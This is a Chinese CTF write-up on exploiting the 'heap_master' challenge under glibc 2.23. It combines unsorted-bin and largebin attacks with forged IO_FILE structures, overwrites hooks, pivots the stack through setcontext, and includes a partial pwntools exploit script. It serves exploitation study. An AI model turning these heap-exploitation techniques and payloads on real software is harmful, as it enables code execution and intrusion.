**作者：V1NKe  
来源：**
## 前言：
最近在学习的过程中，遇到一个很有趣的东西，就是`IO_FILE`和`Largebin Unsortbin
attack`的结合利用，这个技巧能延伸出来很多种利用方式。
## 正文：
就拿最近的*CTF上的`heap_master`来举例。
因为本文主讲利用技巧，所以具体程序分析这里就略过了。程序在`mmap`区域上对堆进行增删改，所以要想构造利用，就得在`mmap`区域上构造chunk。以下均在libc-2.23环境下进行。
### 漏洞点：
有一个类似于UAF的漏洞点。
### 利用初探：
程序没有show函数，那么便很容易想到用修改`stdout`的方式来泄漏，那么该怎么去修改呢，从UAF角度分析，可以利用UAF来达到`Unsortbin
attack`和`Largebin attack`。
### 利用思考：
`Unsortbin
attack`只能任意地址写一个libc地址的值，该如何把这一次任意写利用最大化呢，那么就是修改`global_max_fast`。这样我们就可以得到glibc上的任意地址写堆地址，因为很大的chunk都变成了fastbin，因此越界了规定内的`fastbin_index`，导致可以在任意写堆地址。
用图来表示就是：
![
](https://images.seebug.org/content/images/2019/05/46e164a8-7fd3-4c5e-80e9-72774f4a1e71.png-w331s)
所以可以任意写堆地址。
我们可以覆盖`stdout`，使得`stdout`指向我们的mmap空间，并且我们事先在mmap空间构造好`_IO_2_1_stdout`，导致在打印出程序菜单之前先泄漏了地址。结果为这样：
![
](https://images.seebug.org/content/images/2019/05/5095ec2a-337b-41e3-a6bb-a1281be20f22.png-w331s)
如图`0x57e5c100`开始就是我们事先构造好的`_IO_2_1_stdout`，有的人或许会想问，`0x7f`那些地址怎么来的？很简单，事先构造`0x91`的chunk，free后又add，即可得到libc上的地址，再把低位双字节改成`_IO_2_1_stdout`上的内容，就有`1/16`的概率能够撞到。
泄漏出来：
![
](https://images.seebug.org/content/images/2019/05/d7c5abb5-0627-44a6-8222-71b7b494ad69.png-w331s)
泄漏出地址了，下一步便是劫持程序流了。
这里我们可以利用2.24版本后的`IO_FILE`利用，先劫持`_IO_list_all`，再接着构造`_IO_list_all`，触发`_IO_flush_all_lockp`。
覆盖就很容易了，跟前面所覆盖的`stdout`一样，而构造过程需要根据后续调用来构造了。我们需要触发`_IO_str_jumps`上的`overflow`。通过以下代码来劫持：
    int
    _IO_str_overflow (_IO_FILE *fp, int c)
    {
      int flush_only = c == EOF;
      _IO_size_t pos;
      if (fp->_flags & _IO_NO_WRITES)// pass
          return flush_only ? 0 : EOF;
      if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
        {
          fp->_flags |= _IO_CURRENTLY_PUTTING;
          fp->_IO_write_ptr = fp->_IO_read_ptr;
          fp->_IO_read_ptr = fp->_IO_read_end;
        }
      pos = fp->_IO_write_ptr - fp->_IO_write_base;
      if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in 
        {
          if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // pass
        return EOF;
          else
        {
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          _IO_size_t new_size = 2 * old_blen + 100;
          if (new_size _s._allocate_buffer) (new_size);
劫持程序流：
     new_buf
            = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
我们所需要bypass的几个条件：
    1. fp->_flags & _IO_NO_WRITES为假
    2. fp->_flags & _IO_USER_BUF(0x01)为假
    3. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 不能为负数
    4. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; 这里是劫持到的函数的rdi，即第一参数
    5. fp+0xe0指向需要劫持到的函数
这里我们已经可以控制rip和rdi了，我构造如下：
        _IO_FILE = ( p64(0) +
                     p64(0)*3 +
                     p64(0) +                     # write_base
                     p64(0x7fffffffffffffff) +    # write_ptr
                     p64(0xdadaddaaddddaaaa) +
                     p64(0) +                     # buf_base
                     p64((morecore - 100) / 2) +  #  rdi   buf_end
                     p64(0xdadaddaaddddaaaa)*11 +
                     p64(0) + # + 0xa8
                     p64(0xdadaddaaddddaaaa)*6 +
                     p64(IO_str_j) +          # + 0xd8
                     p64(setcontext))
但是单单控制了rip和rdi还不够，我们还需要把栈空间给转移到mmap上来。
观察上面可以看到，我们先把程序流劫持到这里来：
       0x00007f20066f4b75 :    mov    rsp,QWORD PTR [rdi+0xa0]
       0x00007f20066f4b7c :    mov    rbx,QWORD PTR [rdi+0x80]
       0x00007f20066f4b83 :    mov    rbp,QWORD PTR [rdi+0x78]
       0x00007f20066f4b87 :    mov    r12,QWORD PTR [rdi+0x48]
       0x00007f20066f4b8b :    mov    r13,QWORD PTR [rdi+0x50]
       0x00007f20066f4b8f :    mov    r14,QWORD PTR [rdi+0x58]
       0x00007f20066f4b93 :    mov    r15,QWORD PTR [rdi+0x60]
       0x00007f20066f4b97 :    mov    rcx,QWORD PTR [rdi+0xa8]
       0x00007f20066f4b9e :    push   rcx
       0x00007f20066f4b9f :    mov    rsi,QWORD PTR [rdi+0x70]
       0x00007f20066f4ba3 :    mov    rdx,QWORD PTR [rdi+0x88]
       0x00007f20066f4baa :   mov    rcx,QWORD PTR [rdi+0x98]
       0x00007f20066f4bb1 :   mov    r8,QWORD PTR [rdi+0x28]
       0x00007f20066f4bb5 :   mov    r9,QWORD PTR [rdi+0x30]
       0x00007f20066f4bb9 :   mov    rdi,QWORD PTR [rdi+0x68]
       0x00007f20066f4bbd :   xor    eax,eax
       0x00007f20066f4bbf :   ret    
从第一条语句我们就可以转移栈空间，因为rdi我们可控。中间的rcx可以用`__morecore`维持平衡。
最后栈会成功转移到我们的mmap区域来，所以事先在mmap区域构造好ROP即可劫持整个程序流。
### 利用延伸：
#### 延伸点1：
可以有别的劫持流吗？当然可以。
我们还可以不劫持`_IO_list_all`，换个方式，劫持`_dl_open_hook`。
`_dl_open_hook`是怎么个说法呢？它跟`__free_hook`类似，但是又不一样，区别就在于当它不为NULL时，执行的是`**_dl_open_hook`，而`__free_hook`是执行`*__free_hook`。触发条件是当malloc或free出错时。
当执行到`**_dl_open_hook`时，rax存的就是`*_dl_open_hook`，即堆地址。所以我找到了这么一处`gadgets`：
        => 0x00007fd2f8d9a98a :       mov    rdi,rax
           0x00007fd2f8d9a98d :       call   QWORD PTR [rax+0x20]
这样，我们也控制了`rdi`，往后可以构造劫持到上面所说的转移栈空间的那处`gadgets`。后面的流程也一样了。
#### 延伸点2：
那么`largebin attack`呢？
`largebin attack`实际上也是任意地址修改为堆地址，发生的链表修改操作为：
    fwd->bk_nextsize->fd_nextsize = victim;
    fwd->bk->fd = victim;
通过调试可知这里的任意修改为第二条，每次`largebin attack`可任意修改一次为堆地址。实质上跟`unsortbin
attack`没有太大的区别，只是修改方式不一样。
但是这里可以换一种方式泄漏libc地址。
可以去修改`_IO_2_1_stdout`的`_flag`为堆地址。因为`flag`满足一定的条件时，就可以泄漏：
    if fp->flag & 0xa00 == 1 and fp->flag & 0x1000 == 1 then it will leak something when f->write_base != f->write_ptr
这里也是有一定概率的。除了修改完`_flag`之后，还需要覆盖`write_base`的最低一个字节为`\x00`，这时候可以错位覆盖：
![
](https://images.seebug.org/content/images/2019/05/47f64aaa-020f-4f77-a7e0-cb4e10b63e37.png-w331s)
两处地方修改完之后的情况：
![
](https://images.seebug.org/content/images/2019/05/a5a60b9c-f561-4f74-a39e-756a13eb2e09.png-w331s)
即可泄漏出地址。
往后的劫持程序流跟上面所说的一样，既可以劫持`_dl_open_hook`也可以劫持`_IO_list_all`。
#### 延伸点3:
还可以如何劫持程序流程？可以劫持`__free_hook`。
大致流程就是用`largebin attack`泄漏出地址后（跟上面延伸2一致），再用`largebin
attack`修改`global_max_fast`。这样就可以来利用`fastbin_index_overflow`了。
覆盖`__free_hook`为堆地址之后，修改该堆地址所对应的`chunk`的`fd`指针为`system`地址。这样当把他add取出之后，`__free_hook`地址就变为了`system`的地址：
![
](https://images.seebug.org/content/images/2019/05/e9f781a0-807f-4ff2-b887-05f241ca18ae.png-w331s)
`delete`之后即可触发。
当然了，`__malloc_hook`、`__relloc_hook`等等也是一样的。
### 利用总结：
题目还是很新颖的，从普通堆空间转化到了mmap区域上的堆空间来。可以大胆的去想思路，上面的有些思路仔细想的话其实还是很巧妙的，不管是从找`gadgets`和整个劫持程序流程的构造来说都很巧妙，能够把几种思路都去试着练习一下还是能够收获到很多东西的，思路上、或者是构造利用上。而且上面的几种方式交叉组合一下利用，还能有着多种方式。
### Reference：
  1. 
  2. 
  3. 
  4. 
### EXP：
#### 1\. Unsortbin attack + _IO_list_all
    from pwn import *
    elf = ELF('./heap_master')
    libc = ELF('./libc-2.23.so')
    context.log_level = 'debug'
    def add(size):
        p.sendlineafter('>> ', '1')
        p.sendlineafter('size: ', str(size))
    def edit(off,cont):
        p.sendlineafter('>> ', '2')
        p.sendlineafter('offset: ', str(off))
        p.sendlineafter('size: ', str(len(cont)))
        p.sendafter('content: ', cont)
    def delete(off):
        p.sendlineafter('>> ', '3')
        p.sendlineafter('offset: ', str(off))
    def exp():
        for i in range(0xe):
            edit(0xf8 + i*0x10,p64(0x201))
        for i in range(0x10):
            edit(0x2f8 + i*0x10,p64(0x21))
        for i in range(0xd):
            delete(0x1d0-i*0x10)
            add(0x1f0)
        edit(0x100, p64(0xfbad1800) + p16(0x26a3))
        edit(0x110,p16(0x26a3))
        edit(0x118,p16(0x26a3))
        edit(0x120,p16(0x2618))
        edit(0x128,p16(0x26a3))
        edit(0x130,p16(0x26a3))
        edit(0x138,p16(0x26a3))
        edit(0x140,p16(0x26a3))
        edit(0x148, p64(0)*4 + p16(0x18e0))
        edit(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0xa000000) + p16(0x3780))
        edit(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x17a0))
        edit(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x06e0))
        edit(0x1008,p64(0x91))
        edit(0x1098,p64(0x21))
        edit(0x10b8,p64(0x21))
        #edit(0x1148,p64(0x21))
        delete(0x1010)
        edit(0x1018,p16(0x37f8-0x10)) # unsortbin attack global_max_fast
        add(0x80)
        edit(0x108,p64(0x17e1))
        edit(0x18e8,p64(0x21))
        edit(0x1908,p64(0x21))
        delete(0x110)
        data = u64(p.recv(6).ljust(8,'\x00'))